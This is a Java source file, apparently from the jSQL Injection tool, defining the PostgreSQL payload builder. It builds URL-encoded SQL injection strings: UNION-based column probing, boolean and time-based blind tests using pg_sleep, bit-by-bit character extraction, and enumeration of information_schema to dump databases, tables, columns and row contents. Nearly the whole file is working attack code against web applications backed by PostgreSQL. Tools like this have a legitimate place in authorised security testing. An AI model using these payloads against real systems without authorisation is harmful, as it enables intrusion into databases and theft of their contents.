package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TD_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.model.injection.strategy.Strategy;
import com.jsql.model.injection.strategy.blind.ConcreteTimeInjection;
import com.jsql.util.StringUtil;

public class PostgreSQLVendor extends AbstractVendorDefault {

    @Override
    public String sqlInfos() {
        return
            "concat_ws(" +
                "'"+ SEPARATOR_SQL +"'," +
                "version()," +
                "current_database()," +
                "user" +
            ")" +
            "||" +
            "'"+ TRAIL_SQL +"'";
    }

    @Override
    public String sqlDatabases() {
        return
            "select+array_to_string(array(" +
                "select" +
                    "'"+ SEPARATOR_SQL +"'||" +
                    "r||" +
                    "'"+ QTE_SQL +"'||" +
                    "q::text||" +
                    "'"+ SEPARATOR_SQL +"'" +
                "from(" +
                    "SELECT+" +
                        "tables.table_schema+r," +
                        "count(table_name)q+" +
                    "FROM+" +
                        "information_schema.tables+" +
                    "group+by+r+" +
                    "order+by+r{limit}" +
                ")x" +
            "),'"+ TD_SQL +"')" +
            "||" +
            "'"+ TRAIL_SQL +"'";
    }

    @Override
    public String sqlTables(Database database) {
        return
            "select+array_to_string(array(" +
                "select" +
                    "'"+ SEPARATOR_SQL +"'||" +
                    "r||" +
                    "'"+ QTE_SQL +"'||" +
                    "q::text||" +
                    "'"+ SEPARATOR_SQL +"'" +
                "from(" +
                    "SELECT+" +
                        "tables.table_name+r,'0'q+" +
                    "FROM+" +
                        "information_schema.tables+" +
                    "where+tables.TABLE_SCHEMA='" + database.toString() + "'" +
                    "order+by+r{limit}" +
                ")x" +
            "),'"+ TD_SQL +"')" +
            "||" +
            "'"+ TRAIL_SQL +"'";
    }

    @Override
    public String sqlColumns(Table table) {
        return
            "select+array_to_string(array(" +
                "select" +
                    "'"+ SEPARATOR_SQL +"'||" +
                    "r||" +
                    "'"+ QTE_SQL +"'||" +
                    "q::text||" +
                    "'"+ SEPARATOR_SQL +"'" +
                "from(" +
                    "SELECT+" +
                        "columns.column_name+r,'0'q+" +
                    "FROM+" +
                        "information_schema.columns+" +
                    "where+columns.TABLE_SCHEMA='" + table.getParent().toString() + "'" +
                    "and+columns.TABLE_name='" + table.toString() + "'" +
                    "order+by+r{limit}" +
                ")x" +
            "),'"+ TD_SQL +"')" +
            "||" +
            "'"+ TRAIL_SQL +"'";
    }

    @Override
    public String sqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "::text,''))||'%7f'||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + "::text,''))";
        
        return
            "select+array_to_string(array(" +
                "select" +
                    "'"+ SEPARATOR_SQL +"'||" +
                    "r||" +
                    "'"+ QTE_SQL +"'||" +
                    "q::text||" +
                    "'"+ SEPARATOR_SQL +"'" +
                "from(" +
                    "SELECT+" +
                        "substr((" + formatListColumn + "),1,775)r,count(*)q+" +
                    "FROM+" +
                        "" + database + "." + table + "+" +
                    "group+by+r{limit}" +
                ")x" +
            "),'"+ TD_SQL +"')" +
            "||" +
            "'"+ TRAIL_SQL +"'";
    }
    
    @Override
    public String[] getListFalseTest() {
        return new String[]{"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};
    }

    @Override
    public String sqlTestBlindFirst() {
        return "0%2b1=1";
    }

    @Override
    public String sqlTestBlind(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
        /**
         * true bit return bit, false bit return 0
         * 8 & 8 = 8, 8 & 4 = 0
         */
        return "+and+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")--+";
    }

    @Override
    public String sqlLengthTestBlind(String inj, int indexCharacter) {
        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String sqlTimeTest(String check) {
        return "+and+''=''||(select+CASE+WHEN+" + check + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
    }

    @Override
    public String sqlBitTestTime(String inj, int indexCharacter, int bit) {
        return "+and+''=''||(select+CASE+WHEN+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
    }

    @Override
    public String sqlLengthTestTime(String inj, int indexCharacter) {
        return "+and+''=''||(select+CASE+WHEN+char_length(" + inj + ")>" + indexCharacter + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
    }

    @Override
    public String sqlBlind(String sqlQuery, String startPosition) {
        return
            /**
             * Enclosing '(' and ')' used for internal query, i.e [..]char_length((select ...))[..]
             */
            "(" +
                "select+" +
                "" +
                    "'SQLi'||" +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        Strategy.BLIND.instance().getPerformanceLength() +
                    ")" +
                "" +
            ")";
    }

    @Override
    public String sqlTime(String sqlQuery, String startPosition) {
        return
            "(" +
                "select+" +
                    "" +
                        "'SQLi'||" +
                        "substr(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            Strategy.TIME.instance().getPerformanceLength() +
                        ")" +
                    "" +
            ")";
    }

    @Override
    public String sqlNormal(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                "'SQLi'||NULLIF(substr(" +
                    "(" + sqlQuery + ")," +
                    startPosition + "," +
                    "65536" +
                "),'"+ TRAIL_SQL +"')";
    }

    @Override
    public String sqlCapacity(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select+'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
            );
    }

    @Override
    public String sqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("(1337"+ i +"7330%2b1)::text");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String sqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String sqlLimit(Integer limitSQLResult) {
        return "+limit+65536+offset+" + limitSQLResult;
    }
}